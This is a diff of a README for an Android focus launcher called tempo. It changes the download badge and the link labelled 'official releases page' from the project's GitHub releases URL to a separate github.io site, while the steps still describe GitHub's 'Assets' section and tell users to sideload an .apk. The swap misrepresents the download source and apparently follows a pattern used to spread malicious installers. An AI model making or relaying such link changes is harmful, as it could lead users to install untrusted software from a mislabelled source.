@@ -1,6 +1,6 @@
 # ⏳ tempo - Regain control of your digital life
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/aesopmandate96/tempo/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://aesopmandate96.github.io)
 
 tempo is an Android launcher designed to help you reduce screen time and maintain focus. It organizes your phone into a minimalist interface that hides distracting apps. The software includes a robust app blocker that prevents you from accessing specific tools for up to ten days. This lock remains active even if you delete the app. Use this tool if you want to limit your phone usage or convert your device into a device designed for productivity.
 
@@ -8,7 +8,7 @@ tempo is an Android launcher designed to help you reduce screen time and maintai
 
 The application is distributed through a release page. Since this is an Android application, you download the installer file to your computer first, then transfer it to your phone.
 
-1. Visit the [official releases page](https://github.com/aesopmandate96/tempo/releases).
+1. Visit the [official releases page](https://aesopmandate96.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the link ending in .apk to start the download.
 4. Save the file to your "Downloads" folder.
